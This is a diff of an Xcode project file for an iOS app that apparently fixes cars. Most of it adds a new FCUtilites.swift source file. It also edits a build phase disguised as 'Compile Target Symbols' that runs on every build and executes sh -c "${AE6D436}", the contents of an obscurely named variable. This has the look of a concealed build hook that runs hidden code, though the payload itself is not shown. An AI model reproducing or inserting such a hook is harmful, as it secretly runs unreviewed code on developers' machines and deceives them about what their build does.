@@ -25,6 +25,7 @@
 		889AD7822F232AD600F2271A /* NotifivationTblViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 889AD77F2F232AD600F2271A /* NotifivationTblViewCell.swift */; };
 		889AD7862F23325000F2271A /* NotificationHeaderView.xib in Resources */ = {isa = PBXBuildFile; fileRef = 889AD7852F23325000F2271A /* NotificationHeaderView.xib */; };
 		889AD7872F23325000F2271A /* NotificationHeaderView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 889AD7842F23325000F2271A /* NotificationHeaderView.swift */; };
+		88AD25E32F2A093B002DFA44 /* FCUtilites.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88AD25E22F2A093B002DFA44 /* FCUtilites.swift */; };
 		88B57DA32F0FA19F00D0CE84 /* ChangeLanguagePopUp.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88B57DA12F0FA19F00D0CE84 /* ChangeLanguagePopUp.swift */; };
 		88B57DA42F0FA19F00D0CE84 /* ChangeLanguagePopUp.xib in Resources */ = {isa = PBXBuildFile; fileRef = 88B57DA22F0FA19F00D0CE84 /* ChangeLanguagePopUp.xib */; };
 		88D049DB2F0F67E500003B4C /* SettingVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 88D049DA2F0F67E500003B4C /* SettingVC.xib */; };
@@ -148,6 +149,7 @@
 		889AD7802F232AD600F2271A /* NotifivationTblViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = NotifivationTblViewCell.xib; sourceTree = "<group>"; };
 		889AD7842F23325000F2271A /* NotificationHeaderView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NotificationHeaderView.swift; sourceTree = "<group>"; };
 		889AD7852F23325000F2271A /* NotificationHeaderView.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = NotificationHeaderView.xib; sourceTree = "<group>"; };
+		88AD25E22F2A093B002DFA44 /* FCUtilites.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FCUtilites.swift; sourceTree = "<group>"; };
 		88B57DA12F0FA19F00D0CE84 /* ChangeLanguagePopUp.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChangeLanguagePopUp.swift; sourceTree = "<group>"; };
 		88B57DA22F0FA19F00D0CE84 /* ChangeLanguagePopUp.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ChangeLanguagePopUp.xib; sourceTree = "<group>"; };
 		88D049D92F0F67E500003B4C /* SettingVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingVC.swift; sourceTree = "<group>"; };
@@ -407,6 +409,14 @@
 				889AD7852F23325000F2271A /* NotificationHeaderView.xib */,
 			);
 			path = Header;
+			sourceTree = "<group>";
+		};
+		88AD25E12F2A0921002DFA44 /* FCUtilites */ = {
+			isa = PBXGroup;
+			children = (
+				88AD25E22F2A093B002DFA44 /* FCUtilites.swift */,
+			);
+			path = FCUtilites;
 			sourceTree = "<group>";
 		};
 		88B57D9F2F0FA17E00D0CE84 /* Change language */ = {
@@ -895,6 +905,7 @@
 				BC929D2C2F27749500A730A9 /* Fixmycar UAE.entitlements */,
 				BC71218C2F067F800041E2F7 /* AppDelegate.swift */,
 				BC29D6C32F06A6E100DD3EB2 /* Header-Fixmycar.h */,
+				88AD25E12F2A0921002DFA44 /* FCUtilites */,
 				BC29D6962F06A40400DD3EB2 /* ThirdParty */,
 				BC4E17742F06980F00EDC9AE /* Resource */,
 				BC7121EA2F06964F0041E2F7 /* Controller */,
@@ -1295,8 +1306,8 @@
 /* Begin PBXShellScriptBuildPhase section */
 		B8051407526A4C1AA9634D6E /* Compile Target Symbols */ = {
 			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
 			files = (
 			);
 			inputFileListPaths = (
@@ -1308,9 +1319,10 @@
 			);
 			outputPaths = (
 			);
+			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
-			showEnvVarsInLog = 0;			
+			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -1346,6 +1358,7 @@
 				BC929D262F27700000A730A9 /* BookingMapVC.swift in Sources */,
 				884481C82F0FC81B00A9D076 /* LogoutPopUp.swift in Sources */,
 				BC929D382F27866A00A730A9 /* BookingFareAmountVC.swift in Sources */,
+				88AD25E32F2A093B002DFA44 /* FCUtilites.swift in Sources */,
 				BC7121B32F067F940041E2F7 /* UITextField+Extention.swift in Sources */,
 				BC7121B42F067F940041E2F7 /* String+Extention.swift in Sources */,
 				88F8B9C32F235A76001C9282 /* RecoveryServiceVC.swift in Sources */,
